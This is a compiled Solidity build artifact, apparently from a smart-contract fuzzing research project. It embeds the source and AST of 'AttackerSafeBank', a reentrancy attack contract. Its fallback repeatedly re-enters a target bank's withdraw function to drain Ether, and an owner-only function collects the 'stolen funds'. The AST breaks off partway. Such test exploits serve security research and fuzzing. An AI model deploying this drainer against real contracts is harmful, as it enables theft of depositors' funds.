  "deployedSourceMap": "126:2816:1:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1045:12;;1028:13;;:29;;:79;;;;;1078:29;;1061:13;;:46;;1028:79;1024:653;;;1173:29;;1156:13;;:46;1152:243;;;1239:29;;1223:13;:45;;;;1152:243;;;1366:13;;1349;;:30;;;;;;;:::i;:::-;;;;;;;;1152:243;1554:1;1540:13;;:15;1536:92;;;1576:10;;;;;;;;;;;:19;;;1596:13;;1576:34;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1536:92;1024:653;126:2816;368:28;;;;;;;;;;;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;2614:165;;;;;;;;;;;;;:::i;:::-;;159:43;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;503:28;;;;;;;;;;;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;1750:826;;;;;;;;;;;;;:::i;:::-;;:::i;:::-;;430:46;;;;;;;;;;;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;287:20;;;;;;;;;;;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;314:27;;;;;;;;;;;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;2844:90;;;:::i;:::-;;254:26;;;;;;;;;;;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;368:28;;;;:::o;2614:165::-;2681:5;;;;;;;;;;;2667:19;;:10;:19;;;2659:55;;;;;;;;;;;;:::i;:::-;;;;;;;;;2733:5;;;;;;;;;;;2725:23;;:46;2749:21;2725:46;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;2614:165::o;159:43::-;;;;;;;;;;;;;;;;;:::o;503:28::-;;;;:::o;1750:826::-;1817:21;1880:13;1868:9;:25;1860:95;;;;;;;;;;;;:::i;:::-;;;;;;;;;1992:10;;;;;;;;;;;1984:27;;;1968:43;;2047:13;2030;:30;;2022:105;;;;;;;;;;;;:::i;:::-;;;;;;;;;2163:13;2148:12;:28;;;;2219:9;2203:13;:25;;;2187:13;:41;;;;2309:10;;;;;;;;;;;:18;;;2335:9;2309:38;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;2400:10;;;;;;;;;;;2392:27;;;2360:29;:59;;;;2493:10;;;;;;;;;;;:19;;;2513:9;2493:30;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1750:826;;:::o;430:46::-;;;;:::o;287:20::-;;;;;;;;;;;;;:::o;314:27::-;;;;:::o;2844:90::-;:::o;254:26::-;;;;;;;;;;;;;:::o;7:139:4:-;;91:6;78:20;69:29;;107:33;134:5;107:33;:::i;:::-;59:87;;;;:::o;152:139::-;;236:6;223:20;214:29;;252:33;279:5;252:33;:::i;:::-;204:87;;;;:::o;297:262::-;;405:2;393:9;384:7;380:23;376:32;373:2;;;421:1;418;411:12;373:2;464:1;489:53;534:7;525:6;514:9;510:22;489:53;:::i;:::-;479:63;;435:117;363:196;;;;:::o;565:262::-;;673:2;661:9;652:7;648:23;644:32;641:2;;;689:1;686;679:12;641:2;732:1;757:53;802:7;793:6;782:9;778:22;757:53;:::i;:::-;747:63;;703:117;631:196;;;;:::o;833:118::-;920:24;938:5;920:24;:::i;:::-;915:3;908:37;898:53;;:::o;957:163::-;1060:53;1107:5;1060:53;:::i;:::-;1055:3;1048:66;1038:82;;:::o;1126:321::-;;1289:67;1353:2;1348:3;1289:67;:::i;:::-;1282:74;;1386:25;1382:1;1377:3;1373:11;1366:46;1438:2;1433:3;1429:12;1422:19;;1272:175;;;:::o;1453:389::-;;1616:67;1680:2;1675:3;1616:67;:::i;:::-;1609:74;;1713:34;1709:1;1704:3;1700:11;1693:55;1779:27;1774:2;1769:3;1765:12;1758:49;1833:2;1828:3;1824:12;1817:19;;1599:243;;;:::o;1848:394::-;;2011:67;2075:2;2070:3;2011:67;:::i;:::-;2004:74;;2108:34;2104:1;2099:3;2095:11;2088:55;2174:32;2169:2;2164:3;2160:12;2153:54;2233:2;2228:3;2224:12;2217:19;;1994:248;;;:::o;2248:118::-;2335:24;2353:5;2335:24;:::i;:::-;2330:3;2323:37;2313:53;;:::o;2372:222::-;;2503:2;2492:9;2488:18;2480:26;;2516:71;2584:1;2573:9;2569:17;2560:6;2516:71;:::i;:::-;2470:124;;;;:::o;2600:254::-;;2747:2;2736:9;2732:18;2724:26;;2760:87;2844:1;2833:9;2829:17;2820:6;2760:87;:::i;:::-;2714:140;;;;:::o;2860:419::-;;3064:2;3053:9;3049:18;3041:26;;3113:9;3107:4;3103:20;3099:1;3088:9;3084:17;3077:47;3141:131;3267:4;3141:131;:::i;:::-;3133:139;;3031:248;;;:::o;3285:419::-;;3489:2;3478:9;3474:18;3466:26;;3538:9;3532:4;3528:20;3524:1;3513:9;3509:17;3502:47;3566:131;3692:4;3566:131;:::i;:::-;3558:139;;3456:248;;;:::o;3710:419::-;;3914:2;3903:9;3899:18;3891:26;;3963:9;3957:4;3953:20;3949:1;3938:9;3934:17;3927:47;3991:131;4117:4;3991:131;:::i;:::-;3983:139;;3881:248;;;:::o;4135:222::-;;4266:2;4255:9;4251:18;4243:26;;4279:71;4347:1;4336:9;4332:17;4323:6;4279:71;:::i;:::-;4233:124;;;;:::o;4363:169::-;;4481:6;4476:3;4469:19;4521:4;4516:3;4512:14;4497:29;;4459:73;;;;:::o;4538:305::-;;4597:20;4615:1;4597:20;:::i;:::-;4592:25;;4631:20;4649:1;4631:20;:::i;:::-;4626:25;;4785:1;4717:66;4713:74;4710:1;4707:81;4704:2;;;4791:18;;:::i;:::-;4704:2;4835:1;4832;4828:9;4821:16;;4582:261;;;;:::o;4849:96::-;;4915:24;4933:5;4915:24;:::i;:::-;4904:35;;4894:51;;;:::o;4951:126::-;;5028:42;5021:5;5017:54;5006:65;;4996:81;;;:::o;5083:77::-;;5149:5;5138:16;;5128:32;;;:::o;5166:158::-;;5265:53;5312:5;5265:53;:::i;:::-;5252:66;;5242:82;;;:::o;5330:129::-;;5429:24;5447:5;5429:24;:::i;:::-;5416:37;;5406:53;;;:::o;5465:180::-;5513:77;5510:1;5503:88;5610:4;5607:1;5600:15;5634:4;5631:1;5624:15;5651:122;5724:24;5742:5;5724:24;:::i;:::-;5717:5;5714:35;5704:2;;5763:1;5760;5753:12;5704:2;5694:79;:::o;5779:122::-;5852:24;5870:5;5852:24;:::i;:::-;5845:5;5842:35;5832:2;;5891:1;5888;5881:12;5832:2;5822:79;:::o",
  "source": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\n//import \"./VulnerableContract.sol\";\r\nimport \"./SafeBank.sol\";\r\n\r\ncontract AttackerSafeBank {\r\n    mapping(address => uint256) public balances;\r\n    //VulnerableContract public vulnerable;\r\n    SafeBank public vulnerable;\r\n    address public owner;\r\n    uint256 public targetAmount;  // Amount to drain\r\n    uint256 public drainedAmount;  // Amount already drained\r\n    uint256 public prevBalanceVulnerableContract=0;  // Amount to drain\r\n    uint256 public totalWithdraw; //targetAmount - drainedAmount;\r\n\r\n    constructor(address payable _vulnerableAddress) {\r\n        //vulnerable = VulnerableContract(_vulnerableAddress);\r\n        vulnerable = SafeBank(_vulnerableAddress);\r\n        owner = msg.sender;\r\n    }\r\n\r\n    // Fallback function for reentrancy\r\n    fallback() external payable {\r\n        //uint256 vulnBalance = prevBalanceVulnerableContract; //address(vulnerable).balance;\r\n        \r\n       // uint256 attackBalance = address(this).balance;\r\n        if (totalWithdraw <= targetAmount && totalWithdraw <= prevBalanceVulnerableContract) {\r\n            \r\n            \r\n            if (totalWithdraw == prevBalanceVulnerableContract) {\r\n                totalWithdraw = prevBalanceVulnerableContract;  // Cap withdrawal to remaining balance\r\n            } else {\r\n                totalWithdraw += drainedAmount;\r\n            }\r\n            //drainedAmount += amountToWithdraw;\r\n            \r\n            //prevBalanceVulnerableContract -= drainedAmount;\r\n            if (drainedAmount>0) {\r\n                vulnerable.withdraw(drainedAmount);\r\n              }  // Reenter to withdraw\r\n            \r\n        }\r\n    }\r\n\r\n    // Initiate the attack with a specific target amount\r\n    function attack(uint256 _targetAmount) external payable {\r\n        uint256 balVulnerable; \r\n        \r\n        require(msg.value < _targetAmount, \"Need to send some Ether to attack less than target amount\");\r\n\r\n        balVulnerable = address(vulnerable).balance;\r\n        require(_targetAmount <= balVulnerable, \"Target amount must be less than balance of vulnerable contract\");\r\n        \r\n        targetAmount = _targetAmount;\r\n        drainedAmount = totalWithdraw = msg.value;\r\n        \r\n\r\n        // Deposit initial amount to vulnerable contract\r\n        vulnerable.deposit{value: msg.value}();\r\n\r\n        prevBalanceVulnerableContract = address(vulnerable).balance;\r\n\r\n        // Start reentrancy attack with the initial deposit\r\n        vulnerable.withdraw(msg.value);  // Start by withdrawing the initial deposit\r\n    }\r\n\r\n    // Withdraw stolen funds\r\n    function withdrawFunds() external {\r\n        require(msg.sender == owner, \"Only owner can withdraw\");\r\n        payable(owner).transfer(address(this).balance);\r\n    }\r\n\r\n     // Function to allow the contract to receive Ether\r\n    function deposit() external payable {\r\n        // Function to handle incoming Ether\r\n    }\r\n   \r\n}\r\n",
  "sourcePath": "/Users/andrijasa/Workspace/project/madrl/smartcontractdrlfuz/env1_dev2/contracts/AttackerSafeBank.sol",
  "ast": {
    "absolutePath": "project:/contracts/AttackerSafeBank.sol",
    "exportedSymbols": {
      "AttackerSafeBank": [
        341
      ],
      "SafeBank": [
        424
      ]
    },
    "id": 342,
    "license": "MIT",
    "nodeType": "SourceUnit",
    "nodes": [
      {
        "id": 172,
        "literals": [
          "solidity",
          "^",
          "0.8",
          ".0"
        ],
        "nodeType": "PragmaDirective",
        "src": "33:23:1"
      },
      {
        "absolutePath": "project:/contracts/SafeBank.sol",
        "file": "./SafeBank.sol",
        "id": 173,
        "nodeType": "ImportDirective",
        "scope": 342,
        "sourceUnit": 425,
        "src": "98:24:1",
        "symbolAliases": [],
        "unitAlias": ""
      },
      {
        "abstract": false,
        "baseContracts": [],
        "contractDependencies": [],
        "contractKind": "contract",
        "fullyImplemented": true,
        "id": 341,
        "linearizedBaseContracts": [
          341
        ],
        "name": "AttackerSafeBank",
        "nodeType": "ContractDefinition",
        "nodes": [
          {
            "constant": false,
            "functionSelector": "27e235e3",
            "id": 177,
            "mutability": "mutable",
            "name": "balances",
            "nodeType": "VariableDeclaration",
            "scope": 341,
            "src": "159:43:1",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
              "typeString": "mapping(address => uint256)"
            },
            "typeName": {
              "id": 176,
              "keyType": {
                "id": 174,
                "name": "address",
                "nodeType": "ElementaryTypeName",
                "src": "167:7:1",
                "typeDescriptions": {
                  "typeIdentifier": "t_address",
                  "typeString": "address"
                }
              },
              "nodeType": "Mapping",
              "src": "159:27:1",
              "typeDescriptions": {
                "typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
                "typeString": "mapping(address => uint256)"
              },
              "valueType": {
                "id": 175,
                "name": "uint256",
                "nodeType": "ElementaryTypeName",
                "src": "178:7:1",
                "typeDescriptions": {
                  "typeIdentifier": "t_uint256",
                  "typeString": "uint256"
                }
              }
            },
            "visibility": "public"
          },
          {
            "constant": false,
            "functionSelector": "f66ad59a",
            "id": 180,
            "mutability": "mutable",
            "name": "vulnerable",
            "nodeType": "VariableDeclaration",
            "scope": 341,
            "src": "254:26:1",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_contract$_SafeBank_$424",
              "typeString": "contract SafeBank"
            },
            "typeName": {
              "id": 179,
              "nodeType": "UserDefinedTypeName",
              "pathNode": {
                "id": 178,
                "name": "SafeBank",
                "nodeType": "IdentifierPath",
                "referencedDeclaration": 424,
                "src": "254:8:1"
              },
              "referencedDeclaration": 424,
              "src": "254:8:1",
              "typeDescriptions": {
                "typeIdentifier": "t_contract$_SafeBank_$424",
                "typeString": "contract SafeBank"
              }
            },
            "visibility": "public"
          },
          {
            "constant": false,
            "functionSelector": "8da5cb5b",
            "id": 182,
            "mutability": "mutable",
            "name": "owner",
            "nodeType": "VariableDeclaration",
            "scope": 341,
            "src": "287:20:1",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_address",
              "typeString": "address"
            },
            "typeName": {
              "id": 181,
              "name": "address",
              "nodeType": "ElementaryTypeName",
              "src": "287:7:1",
              "stateMutability": "nonpayable",
              "typeDescriptions": {
                "typeIdentifier": "t_address",
                "typeString": "address"
              }
            },
            "visibility": "public"
          },
          {
            "constant": false,
            "functionSelector": "953b8fb8",
            "id": 184,
            "mutability": "mutable",
            "name": "targetAmount",
            "nodeType": "VariableDeclaration",
            "scope": 341,
            "src": "314:27:1",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_uint256",
              "typeString": "uint256"
            },
            "typeName": {
              "id": 183,
              "name": "uint256",
              "nodeType": "ElementaryTypeName",
              "src": "314:7:1",
              "typeDescriptions": {
                "typeIdentifier": "t_uint256",
                "typeString": "uint256"
              }
            },
            "visibility": "public"
          },
          {
            "constant": false,
            "functionSelector": "0f5ea827",
            "id": 186,
            "mutability": "mutable",
            "name": "drainedAmount",
            "nodeType": "VariableDeclaration",
            "scope": 341,
            "src": "368:28:1",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_uint256",
              "typeString": "uint256"
            },
            "typeName": {
              "id": 185,
              "name": "uint256",
              "nodeType": "ElementaryTypeName",
              "src": "368:7:1",
              "typeDescriptions": {
                "typeIdentifier": "t_uint256",
                "typeString": "uint256"
              }
            },
            "visibility": "public"
          },
          {
            "constant": false,
            "functionSelector": "84670062",
            "id": 189,
            "mutability": "mutable",
            "name": "prevBalanceVulnerableContract",
            "nodeType": "VariableDeclaration",
            "scope": 341,
            "src": "430:46:1",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_uint256",
              "typeString": "uint256"
            },
            "typeName": {
              "id": 187,
              "name": "uint256",
              "nodeType": "ElementaryTypeName",
              "src": "430:7:1",
              "typeDescriptions": {
                "typeIdentifier": "t_uint256",
                "typeString": "uint256"
              }
            },
            "value": {
              "hexValue": "30",
              "id": 188,
              "isConstant": false,
              "isLValue": false,
              "isPure": true,
              "kind": "number",
              "lValueRequested": false,
              "nodeType": "Literal",
              "src": "475:1:1",
              "typeDescriptions": {
                "typeIdentifier": "t_rational_0_by_1",
                "typeString": "int_const 0"
              },
              "value": "0"
            },
            "visibility": "public"
          },
          {
            "constant": false,
            "functionSelector": "455fd623",
            "id": 191,
            "mutability": "mutable",
            "name": "totalWithdraw",
            "nodeType": "VariableDeclaration",
            "scope": 341,
            "src": "503:28:1",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_uint256",
              "typeString": "uint256"
            },
            "typeName": {
              "id": 190,
              "name": "uint256",
              "nodeType": "ElementaryTypeName",
              "src": "503:7:1",
              "typeDescriptions": {
                "typeIdentifier": "t_uint256",
                "typeString": "uint256"
              }
            },
            "visibility": "public"
          },
          {
            "body": {
              "id": 207,
              "nodeType": "Block",
              "src": "620:153:1",
              "statements": [
                {
                  "expression": {
                    "id": 200,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "id": 196,
                      "name": "vulnerable",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 180,
                      "src": "695:10:1",
                      "typeDescriptions": {
                        "typeIdentifier": "t_contract$_SafeBank_$424",
                        "typeString": "contract SafeBank"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "arguments": [
                        {
                          "id": 198,
                          "name": "_vulnerableAddress",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 193,
                          "src": "717:18:1",
                          "typeDescriptions": {
                            "typeIdentifier": "t_address_payable",
                            "typeString": "address payable"
                          }
                        }
                      ],
                      "expression": {
                        "argumentTypes": [
                          {
                            "typeIdentifier": "t_address_payable",
                            "typeString": "address payable"
                          }
                        ],
                        "id": 197,
                        "name": "SafeBank",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 424,
                        "src": "708:8:1",
                        "typeDescriptions": {
                          "typeIdentifier": "t_type$_t_contract$_SafeBank_$424_$",
                          "typeString": "type(contract SafeBank)"
                        }
                      },
                      "id": 199,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "kind": "typeConversion",
                      "lValueRequested": false,
                      "names": [],
                      "nodeType": "FunctionCall",
                      "src": "708:28:1",
                      "tryCall": false,
                      "typeDescriptions": {
                        "typeIdentifier": "t_contract$_SafeBank_$424",
                        "typeString": "contract SafeBank"
                      }
                    },
                    "src": "695:41:1",
                    "typeDescriptions": {
                      "typeIdentifier": "t_contract$_SafeBank_$424",
                      "typeString": "contract SafeBank"
                    }
                  },
                  "id": 201,
                  "nodeType": "ExpressionStatement",
                  "src": "695:41:1"
                },
                {
                  "expression": {
                    "id": 205,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "id": 202,
                      "name": "owner",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 182,
                      "src": "747:5:1",
                      "typeDescriptions": {
                        "typeIdentifier": "t_address",
                        "typeString": "address"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "expression": {
                        "id": 203,
                        "name": "msg",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 4294967281,
                        "src": "755:3:1",
                        "typeDescriptions": {
                          "typeIdentifier": "t_magic_message",
                          "typeString": "msg"
                        }
                      },
                      "id": 204,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberName": "sender",
                      "nodeType": "MemberAccess",
                      "src": "755:10:1",
                      "typeDescriptions": {
                        "typeIdentifier": "t_address",
                        "typeString": "address"
                      }
                    },
                    "src": "747:18:1",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "id": 206,
                  "nodeType": "ExpressionStatement",
                  "src": "747:18:1"
                }
              ]
            },
            "id": 208,
            "implemented": true,
            "kind": "constructor",
            "modifiers": [],
            "name": "",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 194,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 193,
                  "mutability": "mutable",
                  "name": "_vulnerableAddress",
                  "nodeType": "VariableDeclaration",
                  "scope": 208,
                  "src": "584:34:1",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address_payable",
                    "typeString": "address payable"
                  },
                  "typeName": {
                    "id": 192,
                    "name": "address",
                    "nodeType": "ElementaryTypeName",
                    "src": "584:15:1",
                    "stateMutability": "payable",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address_payable",
                      "typeString": "address payable"
                    }
                  },
                  "visibility": "internal"
                }
              ],
              "src": "583:36:1"
            },
            "returnParameters": {
              "id": 195,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "620:0:1"
            },
            "scope": 341,
            "src": "572:201:1",
            "stateMutability": "nonpayable",
            "virtual": false,
            "visibility": "public"
          },
          {
            "body": {
              "id": 245,
              "nodeType": "Block",
              "src": "850:834:1",
              "statements": [
                {
                  "condition": {
                    "commonType": {
                      "typeIdentifier": "t_bool",
                      "typeString": "bool"
                    },
                    "id": 217,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftExpression": {
                      "commonType": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      },
                      "id": 213,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "leftExpression": {
                        "id": 211,
                        "name": "totalWithdraw",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 191,
                        "src": "1028:13:1",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      "nodeType": "BinaryOperation",
                      "operator": "<=",
                      "rightExpression": {
                        "id": 212,
                        "name": "targetAmount",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 184,
                        "src": "1045:12:1",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      "src": "1028:29:1",
                      "typeDescriptions": {
                        "typeIdentifier": "t_bool",
                        "typeString": "bool"
                      }
                    },
                    "nodeType": "BinaryOperation",
                    "operator": "&&",
                    "rightExpression": {
                      "commonType": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      },
                      "id": 216,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "leftExpression": {
                        "id": 214,
                        "name": "totalWithdraw",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 191,
                        "src": "1061:13:1",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      "nodeType": "BinaryOperation",
                      "operator": "<=",
                      "rightExpression": {
                        "id": 215,
                        "name": "prevBalanceVulnerableContract",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 189,
                        "src": "1078:29:1",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      "src": "1061:46:1",
                      "typeDescriptions": {
                        "typeIdentifier": "t_bool",
                        "typeString": "bool"
                      }
                    },
                    "src": "1028:79:1",
                    "typeDescriptions": {
                      "typeIdentifier": "t_bool",
                      "typeString": "bool"
                    }
                  },
                  "id": 244,
                  "nodeType": "IfStatement",
                  "src": "1024:653:1",
                  "trueBody": {
                    "id": 243,
                    "nodeType": "Block",
                    "src": "1109:568:1",
                    "statements": [
                      {
                        "condition": {
                          "commonType": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          },
                          "id": 220,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "leftExpression": {
                            "id": 218,
                            "name": "totalWithdraw",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 191,
                            "src": "1156:13:1",
                            "typeDescriptions": {
                              "typeIdentifier": "t_uint256",
                              "typeString": "uint256"
                            }
                          },
                          "nodeType": "BinaryOperation",
                          "operator": "==",
                          "rightExpression": {
                            "id": 219,
                            "name": "prevBalanceVulnerableContract",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 189,
                            "src": "1173:29:1",
                            "typeDescriptions": {
                              "typeIdentifier": "t_uint256",
                              "typeString": "uint256"
                            }
                          },
                          "src": "1156:46:1",
                          "typeDescriptions": {
                            "typeIdentifier": "t_bool",
                            "typeString": "bool"
                          }
                        },
                        "falseBody": {
                          "id": 230,
                          "nodeType": "Block",
                          "src": "1330:65:1",
                          "statements": [
                            {
                              "expression": {
                                "id": 228,
                                "isConstant": false,
                                "isLValue": false,
                                "isPure": false,
                                "lValueRequested": false,
                                "leftHandSide": {
                                  "id": 226,
                                  "name": "totalWithdraw",
                                  "nodeType": "Identifier",
                                  "overloadedDeclarations": [],
                                  "referencedDeclaration": 191,
                                  "src": "1349:13:1",
                                  "typeDescriptions": {
                                    "typeIdentifier": "t_uint256",
                                    "typeString": "uint256"
                                  }
                                },
                                "nodeType": "Assignment",
                                "operator": "+=",
                                "rightHandSide": {
                                  "id": 227,
                                  "name": "drainedAmount",
                                  "nodeType": "Identifier",
                                  "overloadedDeclarations": [],
                                  "referencedDeclaration": 186,
                                  "src": "1366:13:1",
                                  "typeDescriptions": {
                                    "typeIdentifier": "t_uint256",
                                    "typeString": "uint256"
                                  }
                                },
                                "src": "1349:30:1",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_uint256",
                                  "typeString": "uint256"
                                }
                              },
                              "id": 229,
                              "nodeType": "ExpressionStatement",
                              "src": "1349:30:1"
                            }
                          ]
                        },
                        "id": 231,
                        "nodeType": "IfStatement",
                        "src": "1152:243:1",
                        "trueBody": {
                          "id": 225,
                          "nodeType": "Block",
                          "src": "1204:120:1",
                          "statements": [
                            {
                              "expression": {
                                "id": 223,
                                "isConstant": false,
                                "isLValue": false,
                                "isPure": false,
                                "lValueRequested": false,
                                "leftHandSide": {
                                  "id": 221,
                                  "name": "totalWithdraw",
                                  "nodeType": "Identifier",
                                  "overloadedDeclarations": [],
                                  "referencedDeclaration": 191,
                                  "src": "1223:13:1",
                                  "typeDescriptions": {
                                    "typeIdentifier": "t_uint256",
                                    "typeString": "uint256"
                                  }
                                },
                                "nodeType": "Assignment",
                                "operator": "=",
                                "rightHandSide": {
                                  "id": 222,
                                  "name": "prevBalanceVulnerableContract",
                                  "nodeType": "Identifier",
                                  "overloadedDeclarations": [],
                                  "referencedDeclaration": 189,
                                  "src": "1239:29:1",
                                  "typeDescriptions": {
                                    "typeIdentifier": "t_uint256",
                                    "typeString": "uint256"
                                  }
                                },
                                "src": "1223:45:1",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_uint256",
                                  "typeString": "uint256"
                                }
                              },
                              "id": 224,
                              "nodeType": "ExpressionStatement",
                              "src": "1223:45:1"
                            }
                          ]
                        }
                      },
                      {
                        "condition": {
                          "commonType": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          },
                          "id": 234,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "leftExpression": {
                            "id": 232,
                            "name": "drainedAmount",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 186,
                            "src": "1540:13:1",
                            "typeDescriptions": {
                              "typeIdentifier": "t_uint256",
                              "typeString": "uint256"
                            }
                          },
                          "nodeType": "BinaryOperation",
                          "operator": ">",
                          "rightExpression": {
                            "hexValue": "30",
                            "id": 233,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": true,
                            "kind": "number",
                            "lValueRequested": false,
                            "nodeType": "Literal",
                            "src": "1554:1:1",
                            "typeDescriptions": {
                              "typeIdentifier": "t_rational_0_by_1",
                              "typeString": "int_const 0"
                            },
                            "value": "0"
                          },
                          "src": "1540:15:1",
                          "typeDescriptions": {
                            "typeIdentifier": "t_bool",
                            "typeString": "bool"
                          }
                        },
                        "id": 242,
                        "nodeType": "IfStatement",
                        "src": "1536:92:1",
                        "trueBody": {
                          "id": 241,
                          "nodeType": "Block",
                          "src": "1557:71:1",
                          "statements": [
                            {
                              "expression": {
                                "arguments": [
                                  {
                                    "id": 238,
                                    "name": "drainedAmount",
                                    "nodeType": "Identifier",
                                    "overloadedDeclarations": [],
                                    "referencedDeclaration": 186,
                                    "src": "1596:13:1",
                                    "typeDescriptions": {
                                      "typeIdentifier": "t_uint256",
                                      "typeString": "uint256"
                                    }
                                  }
                                ],
                                "expression": {
                                  "argumentTypes": [
                                    {
                                      "typeIdentifier": "t_uint256",
                                      "typeString": "uint256"
                                    }
                                  ],
                                  "expression": {
                                    "id": 235,
                                    "name": "vulnerable",
                                    "nodeType": "Identifier",
                                    "overloadedDeclarations": [],
                                    "referencedDeclaration": 180,
                                    "src": "1576:10:1",
                                    "typeDescriptions": {
                                      "typeIdentifier": "t_contract$_SafeBank_$424",
                                      "typeString": "contract SafeBank"
                                    }
                                  },
                                  "id": 237,
                                  "isConstant": false,
                                  "isLValue": false,
                                  "isPure": false,
                                  "lValueRequested": false,
                                  "memberName": "withdraw",
                                  "nodeType": "MemberAccess",
                                  "referencedDeclaration": 412,
                                  "src": "1576:19:1",
                                  "typeDescriptions": {
                                    "typeIdentifier": "t_function_external_nonpayable$_t_uint256_$returns$__$",
                                    "typeString": "function (uint256) external"
                                  }
                                },
                                "id": 239,
                                "isConstant": false,
                                "isLValue": false,
                                "isPure": false,
                                "kind": "functionCall",
                                "lValueRequested": false,
                                "names": [],
                                "nodeType": "FunctionCall",
                                "src": "1576:34:1",
                                "tryCall": false,
                                "typeDescriptions": {
                                  "typeIdentifier": "t_tuple$__$",
                                  "typeString": "tuple()"
                                }
                              },
                              "id": 240,
                              "nodeType": "ExpressionStatement",
                              "src": "1576:34:1"
                            }
                          ]
                        }
                      }
                    ]
                  }
                }
              ]
            },
            "id": 246,
            "implemented": true,
            "kind": "fallback",
            "modifiers": [],
            "name": "",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 209,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "830:2:1"
            },
            "returnParameters": {
              "id": 210,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "850:0:1"
            },
            "scope": 341,
            "src": "822:862:1",
            "stateMutability": "payable",
            "virtual": false,
            "visibility": "external"
          },
          {
            "body": {
              "id": 311,
              "nodeType": "Block",
              "src": "1806:770:1",
              "statements": [
                {
                  "assignments": [
                    252
                  ],
                  "declarations": [
                    {
                      "constant": false,
                      "id": 252,
                      "mutability": "mutable",
                      "name": "balVulnerable",
                      "nodeType": "VariableDeclaration",
                      "scope": 311,
                      "src": "1817:21:1",
                      "stateVariable": false,
                      "storageLocation": "default",
